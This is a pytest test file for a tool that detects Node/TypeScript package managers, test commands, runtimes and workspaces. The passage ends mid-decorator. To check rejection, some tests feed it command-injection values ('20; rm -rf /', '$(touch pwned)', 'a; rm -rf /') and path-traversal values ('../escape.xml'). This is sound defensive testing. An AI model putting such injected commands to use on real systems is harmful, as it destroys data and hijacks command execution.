"""P2-10 (SPEC FR-3, §9.4): Node/TypeScript environment detection from a mirror tree.

Tests first, one group per rule: lockfile -> package manager (npm, pnpm, yarn classic and
berry), npm's default test stub, typecheck, build, JUnit reporter, runtime version, simple
monorepos. Everything reads a `TreeReader` (here the in-memory `DictTree`), never a path.
"""

from __future__ import annotations

import json
from collections.abc import Mapping
from pathlib import Path
from typing import Any

import pytest

from mpilot.detect import node as nd
from mpilot.detect.node import (
    DEFAULT_NODE_MAJOR,
    NODE_IMAGE_VERSIONS,
    NodeDetection,
    NodeDetectionError,
    detect_node,
    is_node_project,
    junit_invocation,
    scoped_test_cmd,
)
from mpilot.testing.doubles import DictTree

COMMIT = "a" * 40
NPM_STUB = 'echo "Error: no test specified" && exit 1'


def tree(files: Mapping[str, Any]) -> DictTree:
    """A tree from {path: text or JSON-able value}."""
    return DictTree(
        COMMIT, {p: v if isinstance(v, str) else json.dumps(v) for p, v in files.items()}
    )


def detect(pkg: Mapping[str, Any] | None = None, **files: Any) -> NodeDetection:
    """Detect with a root package.json (default: a bare one) plus extra files given as
    `path__with__slashes`... keyword names cannot hold `/`, so use `detect_files`."""
    return detect_files({"package.json": pkg if pkg is not None else {"name": "x"}, **files})


def detect_files(files: Mapping[str, Any]) -> NodeDetection:
    return detect_node(tree(files))


# --- is this a node project ----------------------------------------------------------------------


def test_a_root_package_json_makes_a_node_project() -> None:
    assert is_node_project(tree({"package.json": {}}))
    assert not is_node_project(tree({"pyproject.toml": ""}))
    assert not is_node_project(tree({"packages/a/package.json": {}}))


# --- package manager from the lockfile -----------------------------------------------------------


@pytest.mark.parametrize(
    ("lockfile", "manager"),
    [
        ("package-lock.json", "npm"),
        ("npm-shrinkwrap.json", "npm"),
        ("pnpm-lock.yaml", "pnpm"),
        ("yarn.lock", "yarn"),
    ],
)
def test_the_lockfile_names_the_package_manager(lockfile: str, manager: str) -> None:
    d = detect_files({"package.json": {}, lockfile: "x"})
    assert d.package_manager.value == manager
    assert d.package_manager.source == lockfile
    assert d.lockfiles == (lockfile,)


@pytest.mark.parametrize(
    ("lockfile", "frozen", "unfrozen"),
    [
        ("package-lock.json", "npm ci", "npm install"),
        ("pnpm-lock.yaml", "pnpm install --frozen-lockfile", "pnpm install"),
        ("yarn.lock", "yarn install --frozen-lockfile", "yarn install"),
    ],
)
def test_install_is_frozen_at_baseline_and_unfrozen_after_the_bump(
    lockfile: str, frozen: str, unfrozen: str
) -> None:
    d = detect_files({"package.json": {}, lockfile: "x"})
    assert d.install_cmd.value == frozen
    assert d.install_unfrozen_cmd.value == unfrozen
    assert d.install_cmd.source == lockfile


def test_the_lockfile_hash_comes_from_the_tree_and_only_the_root_counts() -> None:
    d = detect_files(
        {"package.json": {}, "package-lock.json": "a", "packages/a/package-lock.json": "b"}
    )
    assert list(d.lockfile_hashes) == ["package-lock.json"]
    import hashlib

    assert d.lockfile_hashes["package-lock.json"] == hashlib.sha256(b"a").hexdigest()


# yarn classic and berry


def test_yarn_classic_from_the_lockfile_header() -> None:
    d = detect_files({"package.json": {}, "yarn.lock": "# yarn lockfile v1\n\nleft-pad@^1:\n"})
    assert d.yarn_flavor == "classic"
    assert d.install_cmd.value == "yarn install --frozen-lockfile"


@pytest.mark.parametrize(
    ("files", "source"),
    [
        ({"yarn.lock": "__metadata:\n  version: 6\n"}, "yarn.lock"),
        ({"yarn.lock": "x", ".yarnrc.yml": "nodeLinker: node-modules\n"}, ".yarnrc.yml"),
    ],
)
def test_yarn_berry_from_the_lockfile_or_yarnrc(files: dict[str, str], source: str) -> None:
    d = detect_files({"package.json": {}, **files})
    assert d.package_manager.value == "yarn"
    assert d.yarn_flavor == "berry"
    assert d.install_cmd.value == "yarn install --immutable"
    assert d.install_unfrozen_cmd.value == "yarn install"
    assert source in d.yarn_flavor_source


def test_yarn_berry_from_the_package_manager_field() -> None:
    d = detect_files({"package.json": {"packageManager": "yarn@4.1.0"}, "yarn.lock": "x"})
    assert d.yarn_flavor == "berry"
    d = detect_files({"package.json": {"packageManager": "yarn@1.22.22"}, "yarn.lock": "x"})
    assert d.yarn_flavor == "classic"


def test_yarn_with_nothing_to_tell_the_flavor_is_classic_with_a_warning() -> None:
    d = detect_files({"package.json": {}, "yarn.lock": "x"})
    assert d.yarn_flavor == "classic"
    assert any("classic" in w for w in d.warnings)


def test_a_yarn_lockfile_too_big_to_read_does_not_fail_detection() -> None:
    class Unreadable(DictTree):
        def read_text(self, rel_path: str) -> str | None:
            return None if rel_path == "yarn.lock" else super().read_text(rel_path)

    d = detect_node(Unreadable(COMMIT, {"package.json": "{}", "yarn.lock": "x"}))
    assert d.yarn_flavor == "classic"


# several lockfiles, none, and bun


def test_several_lockfiles_are_settled_by_the_package_manager_field() -> None:
    files = {
        "package.json": {"packageManager": "npm@10.8.2"},
        "package-lock.json": "x",
        "yarn.lock": "x",
    }
    d = detect_files(files)
    assert d.package_manager.value == "npm"
    assert any("several lockfiles" in w for w in d.warnings)


def test_several_lockfiles_without_a_field_use_a_fixed_priority_and_warn() -> None:
    d = detect_files(
        {"package.json": {}, "package-lock.json": "x", "yarn.lock": "x", "pnpm-lock.yaml": "x"}
    )
    assert d.package_manager.value == "pnpm"
    d = detect_files({"package.json": {}, "package-lock.json": "x", "yarn.lock": "x"})
    assert d.package_manager.value == "yarn"
    assert any("several lockfiles" in w for w in d.warnings)
    assert set(d.lockfiles) == {"package-lock.json", "yarn.lock"}


def test_the_lockfile_beats_a_disagreeing_package_manager_field() -> None:
    d = detect_files({"package.json": {"packageManager": "pnpm@9.0.0"}, "package-lock.json": "x"})
    assert d.package_manager.value == "npm"
    assert any("packageManager" in w for w in d.warnings)


def test_no_lockfile_uses_the_package_manager_field_without_a_frozen_install() -> None:
    d = detect_files({"package.json": {"packageManager": "pnpm@9.1.0"}})
    assert d.package_manager.value == "pnpm"
    assert d.package_manager.source == "package.json#packageManager"
    assert d.install_cmd.value == "pnpm install"  # a frozen install needs a lockfile
    assert d.lockfiles == ()
    assert any("no lockfile" in w for w in d.warnings)


def test_no_lockfile_and_no_field_is_npm_install_with_a_warning() -> None:
    d = detect_files({"package.json": {}})
    assert (d.package_manager.value, d.install_cmd.value) == ("npm", "npm install")
    assert d.package_manager.source == "default"
    assert any("no lockfile" in w for w in d.warnings)


def test_a_pnpm_workspace_file_means_pnpm_even_without_a_lockfile() -> None:
    d = detect_files({"package.json": {}, "pnpm-workspace.yaml": "packages:\n  - 'packages/*'\n"})
    assert d.package_manager.value == "pnpm"
    assert d.package_manager.source == "pnpm-workspace.yaml"


@pytest.mark.parametrize("field", ["bun@1.1.0", "deno@1", "nonsense", "npm", "@1", ""])
def test_an_unusable_package_manager_field_is_ignored(field: str) -> None:
    d = detect_files({"package.json": {"packageManager": field}, "package-lock.json": "x"})
    assert d.package_manager.value == "npm"


def test_bun_alone_is_unsupported() -> None:
    for lock in ("bun.lockb", "bun.lock"):
        with pytest.raises(NodeDetectionError, match="Bun is unsupported"):
            detect_files({"package.json": {}, lock: "x"})


def test_bun_next_to_another_lockfile_is_ignored_with_a_warning() -> None:
    d = detect_files({"package.json": {}, "bun.lockb": "x", "package-lock.json": "x"})
    assert d.package_manager.value == "npm"
    assert any("bun" in w.lower() for w in d.warnings)


# --- tests: scripts.test, ignoring npm's default stub --------------------------------------------


@pytest.mark.parametrize(
    ("lockfile", "command"),
    [
        ("package-lock.json", "npm test"),
        ("pnpm-lock.yaml", "pnpm test"),
        ("yarn.lock", "yarn test"),
    ],
)
def test_the_test_command_runs_the_test_script(lockfile: str, command: str) -> None:
    d = detect_files({"package.json": {"scripts": {"test": "jest"}}, lockfile: "x"})
    assert d.test_cmd is not None
    assert d.test_cmd.value == command
    assert d.test_cmd.source == "package.json#scripts.test"


@pytest.mark.parametrize(
    "stub",
    [
        NPM_STUB,
        'echo "Error: no test specified" && exit 1',
        "echo 'Error: no test specified' && exit 1",
        'echo "Error: no test specified"&&exit 1',
        '  echo   "Error: no test specified"  &&  exit  1  ',
        'echo "Error: no test specified" && exit 1;',
    ],
)
def test_npms_default_test_stub_is_ignored(stub: str) -> None:
    d = detect({"scripts": {"test": stub}})
    assert d.test_cmd is None
    assert any("no test command" in w for w in d.warnings)


@pytest.mark.parametrize("value", ["", "   ", None, 5, ["jest"], {"a": 1}, True])
def test_a_missing_or_odd_test_script_means_no_test_command(value: Any) -> None:
    d = detect({"scripts": {"test": value}})
    assert d.test_cmd is None


@pytest.mark.parametrize("scripts", [None, [], "x", 5, {"test": None}])
def test_odd_scripts_sections_do_not_break_detection(scripts: Any) -> None:
    d = detect({"scripts": scripts})
    assert d.test_cmd is None
    assert d.build_cmd is None


def test_a_real_script_that_mentions_the_stub_text_is_kept() -> None:
    d = detect({"scripts": {"test": 'echo "Error: no test specified" && exit 1 || jest'}})
    assert d.test_cmd is not None


# --- typecheck -----------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("lockfile", "command"),
    [
        ("package-lock.json", "npm run typecheck"),
        ("pnpm-lock.yaml", "pnpm run typecheck"),
        ("yarn.lock", "yarn run typecheck"),
    ],
)
def test_the_typecheck_script_is_used(lockfile: str, command: str) -> None:
    d = detect_files({"package.json": {"scripts": {"typecheck": "tsc -p ."}}, lockfile: "x"})
    assert d.typecheck_cmd is not None
    assert d.typecheck_cmd.value == command
    assert d.typecheck_cmd.source == "package.json#scripts.typecheck"


def test_type_check_with_a_hyphen_is_accepted_and_typecheck_wins() -> None:
    d = detect({"scripts": {"type-check": "tsc"}})
    assert d.typecheck_cmd is not None
    assert d.typecheck_cmd.value == "npm run type-check"
    d = detect({"scripts": {"type-check": "tsc", "typecheck": "tsc -b"}})
    assert d.typecheck_cmd is not None
    assert d.typecheck_cmd.value == "npm run typecheck"


@pytest.mark.parametrize(
    ("lockfile", "command"),
    [
        ("package-lock.json", "npx --no-install tsc --noEmit"),
        ("pnpm-lock.yaml", "pnpm exec tsc --noEmit"),
        ("yarn.lock", "yarn tsc --noEmit"),
    ],
)
def test_without_a_script_tsc_noemit_is_used_when_typescript_is_a_dependency(
    lockfile: str, command: str
) -> None:
    pkg = {"devDependencies": {"typescript": "^5.4.0"}}
    d = detect_files({"package.json": pkg, "tsconfig.json": "{}", lockfile: "x"})
    assert d.typecheck_cmd is not None
    assert d.typecheck_cmd.value == command
    assert d.typecheck_cmd.source == "tsconfig.json + typescript dependency"


def test_tsc_fallback_needs_both_a_tsconfig_and_the_typescript_package() -> None:
    assert (
        detect_files({"package.json": {"devDependencies": {"typescript": "5"}}}).typecheck_cmd
        is None
    )
    assert detect_files({"package.json": {}, "tsconfig.json": "{}"}).typecheck_cmd is None
    deps = {"dependencies": {"typescript": "5"}}
    assert detect_files({"package.json": deps, "tsconfig.json": "{}"}).typecheck_cmd is not None


def test_no_typecheck_for_a_plain_javascript_project() -> None:
    assert detect({"scripts": {"test": "jest"}}).typecheck_cmd is None


# --- build ---------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("lockfile", "command"),
    [
        ("package-lock.json", "npm run build"),
        ("pnpm-lock.yaml", "pnpm run build"),
        ("yarn.lock", "yarn run build"),
    ],
)
def test_the_build_script_is_used(lockfile: str, command: str) -> None:
    d = detect_files({"package.json": {"scripts": {"build": "tsc"}}, lockfile: "x"})
    assert d.build_cmd is not None
    assert (d.build_cmd.value, d.build_cmd.source) == (command, "package.json#scripts.build")


def test_no_build_script_means_no_build_command() -> None:
    assert detect({"scripts": {"test": "jest"}}).build_cmd is None


def test_other_script_names_are_never_picked_up() -> None:
    d = detect({"scripts": {"compile": "tsc", "lint": "eslint .", "check": "tsc", "prebuild": "x"}})
    assert d.build_cmd is None
    assert d.typecheck_cmd is None


# --- the test runner and its JUnit reporter ------------------------------------------------------


@pytest.mark.parametrize(
    ("script", "runner"),
    [
        ("jest", "jest"),
        ("jest --coverage --runInBand", "jest"),
        ("NODE_OPTIONS=--experimental-vm-modules jest", "jest"),
        ("cross-env CI=true jest", "jest"),
        ("vitest run", "vitest"),
        ("vitest", "vitest"),
        ("mocha 'test/**/*.js'", "mocha"),
        ("c8 mocha", "mocha"),
        ("node --test", "node-test"),
        ("node --test test/", "node-test"),
    ],
)
def test_the_runner_is_read_from_the_test_script(script: str, runner: str) -> None:
    d = detect({"scripts": {"test": script}})
    assert d.test_runner is not None
    assert (d.test_runner.value, d.test_runner.source) == (runner, "package.json#scripts.test")


def test_the_runner_falls_back_to_the_dependencies() -> None:
    d = detect({"scripts": {"test": "run-tests.sh"}, "devDependencies": {"vitest": "^1"}})
    assert d.test_runner is not None
    assert (d.test_runner.value, d.test_runner.source) == (
        "vitest",
        "package.json#devDependencies.vitest",
    )


def test_the_script_beats_the_dependencies_and_the_first_mention_wins() -> None:
    d = detect({"scripts": {"test": "mocha"}, "devDependencies": {"jest": "^29", "vitest": "^1"}})
    assert d.test_runner is not None
    assert d.test_runner.value == "mocha"
    d = detect({"scripts": {"test": "jest && vitest run"}})
    assert d.test_runner is not None
    assert d.test_runner.value == "jest"


def test_a_runner_is_found_through_run_script_wrappers() -> None:
    scripts = {"test": "npm run test:unit", "test:unit": "vitest run"}
    d = detect({"scripts": scripts})
    assert d.test_runner is not None
    assert d.test_runner.value == "vitest"
    scripts = {"test": "pnpm run a", "a": "yarn run b", "b": "npm run c", "c": "jest", "d": "jest"}
    assert detect({"scripts": scripts}).test_runner is not None  # three hops
    deeper = {
        "test": "npm run a",
        "a": "npm run b",
        "b": "npm run c",
        "c": "npm run d",
        "d": "jest",
    }
    assert detect({"scripts": deeper}).test_runner is None  # more than three hops: not followed


def test_a_script_calling_itself_does_not_loop() -> None:
    d = detect({"scripts": {"test": "npm run test"}})
    assert d.test_runner is None


def test_a_word_inside_another_word_is_not_a_runner() -> None:
    assert detect({"scripts": {"test": "my-jester-wrapper"}}).test_runner is None
    assert detect({"scripts": {"test": "unmocha-thing"}}).test_runner is None


def test_jest_with_jest_junit_has_a_junit_reporter() -> None:
    d = detect({"scripts": {"test": "jest"}, "devDependencies": {"jest": "29", "jest-junit": "16"}})
    assert d.junit_reporter is not None
    assert (d.junit_reporter.value, d.junit_reporter.source) == (
        "jest-junit",
        "package.json#devDependencies.jest-junit",
    )


def test_jest_without_jest_junit_has_none() -> None:
    d = detect({"scripts": {"test": "jest"}, "devDependencies": {"jest": "29"}})
    assert d.junit_reporter is None
    assert any("jest-junit" in w for w in d.warnings)


def test_vitest_has_a_built_in_junit_reporter() -> None:
    d = detect({"scripts": {"test": "vitest run"}, "devDependencies": {"vitest": "1"}})
    assert d.junit_reporter is not None
    assert d.junit_reporter.value == "vitest-junit"
    assert d.junit_reporter.source == "vitest built-in reporter"


def test_mocha_needs_mocha_junit_reporter() -> None:
    d = detect({"scripts": {"test": "mocha"}, "devDependencies": {"mocha-junit-reporter": "2"}})
    assert d.junit_reporter is not None
    assert d.junit_reporter.value == "mocha-junit-reporter"
    assert detect({"scripts": {"test": "mocha"}}).junit_reporter is None


def test_node_test_has_no_junit_reporter_here() -> None:
    assert detect({"scripts": {"test": "node --test"}}).junit_reporter is None


def jd(script: str, deps: dict[str, str], lockfile: str = "package-lock.json") -> NodeDetection:
    return detect_files(
        {"package.json": {"scripts": {"test": script}, "devDependencies": deps}, lockfile: "x"}
    )


def test_the_junit_command_for_jest() -> None:
    """jest-junit takes no CLI options: its output file and ID templates go in through the
    exec environment (which beats a repo's own `jest-junit` config, P2-14a recording), so
    the XML lands at `output_path` and carries file-qualified names and suite errors."""
    inv = junit_invocation(jd("jest", {"jest": "29", "jest-junit": "16"}), "reports/junit.xml")
    assert inv is not None
    assert inv.cmd == "npm test -- --reporters=default --reporters=jest-junit"
    assert inv.output_path == "reports/junit.xml"
    assert inv.env == {
        "JEST_JUNIT_OUTPUT_DIR": "reports",
        "JEST_JUNIT_OUTPUT_NAME": "junit.xml",
        "JEST_JUNIT_CLASSNAME": "{filepath}",
        "JEST_JUNIT_TITLE": "{classname} › {title}",
        "JEST_JUNIT_ANCESTOR_SEPARATOR": " › ",
        "JEST_JUNIT_ADD_FILE_ATTRIBUTE": "true",
        "JEST_JUNIT_REPORT_TEST_SUITE_ERRORS": "true",
    }
    top = junit_invocation(jd("jest", {"jest": "29", "jest-junit": "16"}), "junit.xml")
    assert top is not None
    assert (top.env["JEST_JUNIT_OUTPUT_DIR"], top.env["JEST_JUNIT_OUTPUT_NAME"]) == (
        ".",
        "junit.xml",
    )


def test_the_jest_junit_environment_may_enter_the_sandbox() -> None:
    """Every variable is on the driver's exec allowlist and passes the credential floor."""
    from mpilot.sandbox.driver import env_problems

    inv = junit_invocation(jd("jest", {"jest": "29", "jest-junit": "16"}), "out/junit.xml")
    assert inv is not None
    assert env_problems(inv.env) == []


def test_only_jest_needs_an_environment() -> None:
    vitest = junit_invocation(jd("vitest run", {"vitest": "1"}), "junit.xml")
    mocha = junit_invocation(jd("mocha", {"mocha-junit-reporter": "2"}), "junit.xml")
    assert vitest is not None
    assert mocha is not None
    assert vitest.env == {}
    assert mocha.env == {}


def test_the_junit_command_for_vitest_per_package_manager() -> None:
    deps = {"vitest": "1"}
    flags = "--reporter=default --reporter=junit --outputFile.junit=reports/junit.xml"
    cases = [
        ("package-lock.json", f"npm test -- {flags}"),
        ("pnpm-lock.yaml", f"pnpm test {flags}"),
        ("yarn.lock", f"yarn test {flags}"),
    ]
    for lockfile, expected in cases:
        inv = junit_invocation(jd("vitest run", deps, lockfile), "reports/junit.xml")
        assert inv is not None
        assert (inv.cmd, inv.output_path) == (expected, "reports/junit.xml")


def test_the_junit_command_for_mocha() -> None:
    inv = junit_invocation(jd("mocha", {"mocha-junit-reporter": "2"}), "out/results.xml")
    assert inv is not None
    assert (
        inv.cmd == "npm test -- --reporter mocha-junit-reporter "
        "--reporter-options mochaFile=out/results.xml"
    )
    assert inv.output_path == "out/results.xml"


@pytest.mark.parametrize(
    "script",
    [
        "jest && eslint .",
        "jest || true",
        "jest; echo done",
        "jest | tee out",
        "jest & wait",
        "npm run test:unit",
        "pnpm run t",
    ],
)
def test_no_junit_command_when_flags_cannot_be_appended_safely(script: str) -> None:
    scripts = {"test": script, "test:unit": "jest", "t": "jest"}
    d = detect({"scripts": scripts, "devDependencies": {"jest-junit": "16", "jest": "29"}})
    assert d.junit_reporter is not None
    assert junit_invocation(d, "junit.xml") is None
    assert any("cannot add reporter flags" in w for w in d.warnings)


def test_no_junit_command_without_a_reporter_or_a_test_command() -> None:
    assert junit_invocation(jd("jest", {"jest": "29"}), "junit.xml") is None
    assert junit_invocation(detect({"scripts": {}}), "junit.xml") is None


@pytest.mark.parametrize(
    "bad",
    ["", "../escape.xml", "/abs.xml", "a b.xml", "a;b.xml", "-rf.xml", "x\n.xml", "a/../b.xml"],
)
def test_the_junit_output_path_must_be_a_plain_relative_path(bad: str) -> None:
    d = jd("vitest run", {"vitest": "1"})
    with pytest.raises(ValueError, match="output path"):
        junit_invocation(d, bad)


# --- runtime version -----------------------------------------------------------------------------


def runtime(**files: Any) -> NodeDetection:
    pkg = files.pop("pkg", {})
    return detect_files(
        {
            "package.json": pkg,
            **{k.replace("__", "/").replace("_dot_", "."): v for k, v in files.items()},
        }
    )


@pytest.mark.parametrize(
    ("nvmrc", "major"),
    [
        ("v20.11.0\n", "20"),
        ("20", "20"),
        ("20.11", "20"),
        ("v18.20.8", "18"),
        ("22.1.0", "22"),
        ("lts/*", "22"),
        ("lts/iron", "20"),
        ("lts/hydrogen", "18"),
        ("lts/jod", "22"),
        ("LTS/Iron", "20"),
        ("node", "22"),
        ("stable", "22"),
        ("latest", "22"),
    ],
)
def test_nvmrc_names_the_runtime(nvmrc: str, major: str) -> None:
    d = detect_files({"package.json": {}, ".nvmrc": nvmrc})
    assert (d.runtime_version.value, d.runtime_version.source) == (major, ".nvmrc")
    assert not [w for w in d.warnings if ".nvmrc" in w or "asks for node" in w], d.warnings


@pytest.mark.parametrize(
    ("nvmrc", "major"),
    [
        ("16", "18"),
        ("14.21.3", "18"),
        ("lts/gallium", "18"),
        ("24", "22"),
        ("21", "22"),
        ("19.1.0", "20"),
        ("17", "18"),
    ],
)
def test_a_version_without_an_image_maps_to_the_nearest_supported_one_with_a_warning(
    nvmrc: str, major: str
) -> None:
    d = detect_files({"package.json": {}, ".nvmrc": nvmrc})
    assert d.runtime_version.value == major
    assert any("asks for node" in w for w in d.warnings)
    assert d.node_requested == nvmrc.strip()


def test_node_version_file_comes_after_nvmrc_and_before_engines() -> None:
    files = {"package.json": {"engines": {"node": ">=22"}}, ".node-version": "20.1.0\n"}
    d = detect_files(files)
    assert (d.runtime_version.value, d.runtime_version.source) == ("20", ".node-version")
    d = detect_files({**files, ".nvmrc": "18"})
    assert (d.runtime_version.value, d.runtime_version.source) == ("18", ".nvmrc")


@pytest.mark.parametrize(
    ("engines", "major"),
    [
        (">=18", "18"),
        (">=20", "20"),
        (">=22", "22"),
        ("^18 || ^20", "18"),
        ("^20 || ^22", "20"),
        (">=16", "18"),
        (">=14.0.0 <21", "18"),
        ("20.x", "20"),
        ("22", "22"),
        (">=18.17.0", "18"),
        ("~20.10.0", "20"),
        ("18 - 22", "18"),
        (">=19", "20"),
    ],
)
def test_engines_node_picks_the_lowest_supported_runtime_that_satisfies_it(
    engines: str, major: str
) -> None:
    d = detect_files({"package.json": {"engines": {"node": engines}}})
    assert (d.runtime_version.value, d.runtime_version.source) == (
        major,
        "package.json#engines.node",
    )
    assert not any("asks for node" in w for w in d.warnings)


@pytest.mark.parametrize(
    ("engines", "major"),
    [
        (">=24", "22"),
        ("^22.30.0", "22"),
        ("<18", "18"),
        ("^16", "18"),
        ("^18.30.0", "18"),
        (">=18.30.0 <19", "18"),
    ],
)
def test_engines_no_image_satisfies_maps_to_the_closest_with_a_warning(
    engines: str, major: str
) -> None:
    d = detect_files({"package.json": {"engines": {"node": engines}}})
    assert d.runtime_version.value == major
    assert any("closest" in w for w in d.warnings)


@pytest.mark.parametrize("engines", ["lts/*", "latest", ">=a", "^", "1.2.3.4"])
def test_an_engines_range_that_cannot_be_read_falls_through_with_a_warning(engines: str) -> None:
    d = detect_files({"package.json": {"engines": {"node": engines}}})
    assert (d.runtime_version.value, d.runtime_version.source) == (DEFAULT_NODE_MAJOR, "default")
    assert any("engines.node" in w for w in d.warnings)


def test_an_unreadable_nvmrc_falls_through_to_engines() -> None:
    d = detect_files({"package.json": {"engines": {"node": ">=20"}}, ".nvmrc": "what is this"})
    assert (d.runtime_version.value, d.runtime_version.source) == (
        "20",
        "package.json#engines.node",
    )
    assert any(".nvmrc" in w for w in d.warnings)


@pytest.mark.parametrize(
    "nvmrc", ["", "   \n", "\n\n", "iojs", "system", "default", "20; rm -rf /", "v", "x.y.z"]
)
def test_nonsense_in_nvmrc_is_ignored_with_a_warning(nvmrc: str) -> None:
    d = detect_files({"package.json": {}, ".nvmrc": nvmrc})
    assert (d.runtime_version.value, d.runtime_version.source) == (DEFAULT_NODE_MAJOR, "default")


def test_the_default_is_the_newest_supported_runtime() -> None:
    d = detect({"name": "x"})
    assert (d.runtime_version.value, d.runtime_version.source) == (DEFAULT_NODE_MAJOR, "default")
    assert max(NODE_IMAGE_VERSIONS, key=int) == DEFAULT_NODE_MAJOR


@pytest.mark.parametrize(
    "engines", [None, [], "x", 5, {"node": 20}, {"node": None}, {"npm": ">=9"}]
)
def test_odd_engines_sections_are_ignored(engines: Any) -> None:
    d = detect({"engines": engines})
    assert d.runtime_version.source == "default"


def test_the_runtime_table_matches_the_image_lock_and_the_dockerfile() -> None:
    from mpilot.sandbox import images as im

    lock = im.read_lock(im.default_images_dir() / im.LOCK_FILENAME)
    for key, entry in lock.images.items():
        if key.startswith("node:"):
            assert NODE_IMAGE_VERSIONS[key.split(":")[1]] == entry.tools["node"].lstrip("v"), key
    node = next(e for e in im.ECOSYSTEMS if e.name == "node")
    assert set(NODE_IMAGE_VERSIONS) == set(node.versions)


# --- simple monorepos ----------------------------------------------------------------------------


MONO = {
    "package.json": {"name": "root", "private": True, "workspaces": ["packages/*", "apps/web"]},
    "packages/a/package.json": {"name": "@acme/a", "scripts": {"test": "jest"}},
    "packages/b/package.json": {"name": "@acme/b"},
    "packages/b/src/package.json": {"name": "nested-not-matched"},
    "apps/web/package.json": {"name": "web", "scripts": {"test": "vitest"}},
    "apps/other/package.json": {"name": "other"},
    "node_modules/pkg/package.json": {"name": "dep"},
    "package-lock.json": "x",
}


def test_npm_style_workspaces_are_resolved_to_package_directories() -> None:
    d = detect_files(MONO)
    assert [w.dir for w in d.workspaces] == ["apps/web", "packages/a", "packages/b"]
    assert [w.name for w in d.workspaces] == ["web", "@acme/a", "@acme/b"]
    assert [w.has_test_script for w in d.workspaces] == [True, True, False]
    assert d.is_monorepo


def test_the_workspaces_object_form_is_accepted() -> None:
    files = {**MONO, "package.json": {"workspaces": {"packages": ["packages/*"]}}}
    assert [w.dir for w in detect_files(files).workspaces] == ["packages/a", "packages/b"]


def test_pnpm_workspace_yaml_lists_the_packages() -> None:
    files = {
        **MONO,
        "package.json": {"name": "root"},
        "pnpm-workspace.yaml": "packages:\n  - 'packages/*'\n  - \"apps/*\"\n  - '!apps/other'\n",
        "pnpm-lock.yaml": "x",
    }
    del files["package-lock.json"]
    d = detect_files(files)
    assert [w.dir for w in d.workspaces] == ["apps/web", "packages/a", "packages/b"]


def test_negated_and_double_star_globs() -> None:
    files = {
        "package.json": {"workspaces": ["libs/**", "!libs/skip", "!**/legacy"]},
        "libs/x/package.json": {"name": "x"},
        "libs/skip/package.json": {"name": "skip"},
        "libs/deep/y/package.json": {"name": "y"},
        "libs/deep/legacy/package.json": {"name": "z"},
    }
    d = detect_files(files)
    assert [w.dir for w in d.workspaces] == ["libs/deep/y", "libs/x"]


def test_workspace_globs_never_reach_into_node_modules() -> None:
    files = {
        "package.json": {"workspaces": ["**"]},
        "a/package.json": {"name": "a"},
        "node_modules/b/package.json": {"name": "b"},
        "a/node_modules/c/package.json": {"name": "c"},
    }
    assert [w.dir for w in detect_files(files).workspaces] == ["a"]


def test_a_plain_project_is_not_a_monorepo() -> None:
    d = detect({"scripts": {"test": "jest"}})
    assert not d.is_monorepo
    assert d.workspaces == ()
    assert d.root_test_covers_workspaces is None


@pytest.mark.parametrize(
    ("script", "covers"),
    [
        ("npm test --workspaces", True),
        ("npm run test -ws", True),
        ("pnpm -r test", True),
        ("pnpm --recursive test", True),
        ("yarn workspaces foreach run test", True),
        ("turbo run test", True),
        ("nx run-many -t test", True),
        ("lerna run test", True),
        ("jest", False),
        ("vitest run --root packages/a", False),
    ],
)
def test_the_root_test_script_covers_the_workspaces_or_it_does_not(
    script: str, covers: bool
) -> None:
    files = {**MONO, "package.json": {**MONO["package.json"], "scripts": {"test": script}}}  # type: ignore[dict-item]
    assert detect_files(files).root_test_covers_workspaces is covers


def test_without_a_root_test_script_the_root_covers_nothing() -> None:
    assert detect_files(MONO).root_test_covers_workspaces is False


def test_scoped_test_commands_per_package_manager() -> None:
    files = {**MONO}
    d = detect_files(files)
    npm = next(w for w in d.workspaces if w.dir == "packages/a")
    assert scoped_test_cmd(d, npm) == "npm test --workspace=packages/a"
    pn = detect_files({**files, "pnpm-lock.yaml": "x", "package-lock.json": ""})
    assert pn.package_manager.value in ("pnpm", "npm")
    only_pnpm = {k: v for k, v in files.items() if k != "package-lock.json"}
    pn = detect_files({**only_pnpm, "pnpm-lock.yaml": "x"})
    assert (
        scoped_test_cmd(pn, next(w for w in pn.workspaces if w.dir == "packages/a"))
        == "pnpm --filter ./packages/a test"
    )
    yn = detect_files({**only_pnpm, "yarn.lock": "x"})
    assert (
        scoped_test_cmd(yn, next(w for w in yn.workspaces if w.dir == "packages/a"))
        == "yarn workspace @acme/a test"
    )


def test_a_package_without_a_test_script_has_no_scoped_command() -> None:
    d = detect_files(MONO)
    b = next(w for w in d.workspaces if w.dir == "packages/b")
    assert scoped_test_cmd(d, b) is None


def test_hostile_workspace_names_and_directories_are_left_out_with_a_warning() -> None:
    files = {
        "package.json": {"workspaces": ["pkgs/*"]},
        "pkgs/ok/package.json": {"name": "ok", "scripts": {"test": "jest"}},
        "pkgs/$(touch pwned)/package.json": {"name": "x"},
        "pkgs/semi;colon/package.json": {"name": "y"},
        "pkgs/space dir/package.json": {"name": "z"},
        "pkgs/badname/package.json": {"name": "a; rm -rf /", "scripts": {"test": "jest"}},
        "pkgs/-flag/package.json": {"name": "f"},
        "package-lock.json": "x",
    }
    d = detect_files(files)
    assert [w.dir for w in d.workspaces] == ["pkgs/badname", "pkgs/ok"]
    bad = next(w for w in d.workspaces if w.dir == "pkgs/badname")
    assert bad.name is None, "an unsafe name is dropped"
    assert (
        scoped_test_cmd(detect_files({**files, "yarn.lock": "x", "package-lock.json": ""}), bad)
        is None
    )
    assert sum("left out" in w for w in d.warnings) >= 4


def test_a_workspace_package_json_that_is_not_json_is_skipped_with_a_warning() -> None:
    files = {
        "package.json": {"workspaces": ["p/*"]},
        "p/a/package.json": "{not json",
        "p/b/package.json": {"name": "b"},
    }
    d = detect_files(files)
    assert [w.dir for w in d.workspaces] == ["p/b"]
    assert any("p/a/package.json" in w for w in d.warnings)


def test_the_workspace_list_is_capped() -> None:
    files: dict[str, Any] = {"package.json": {"workspaces": ["p/*"]}}
    files.update(
        {f"p/{i:04d}/package.json": {"name": f"n{i}"} for i in range(nd.MAX_WORKSPACES + 20)}
    )
    d = detect_files(files)
    assert len(d.workspaces) == nd.MAX_WORKSPACES
    assert any("more than" in w for w in d.warnings)


# --- malformed and hostile input -----------------------------------------------------------------


def test_no_package_json_is_an_error() -> None:
    with pytest.raises(NodeDetectionError, match=r"no package\.json"):
        detect_node(tree({"pyproject.toml": ""}))


@pytest.mark.parametrize("text", ["", "{", "not json", "[]", "null", "5", '"s"', "{'a': 1}"])
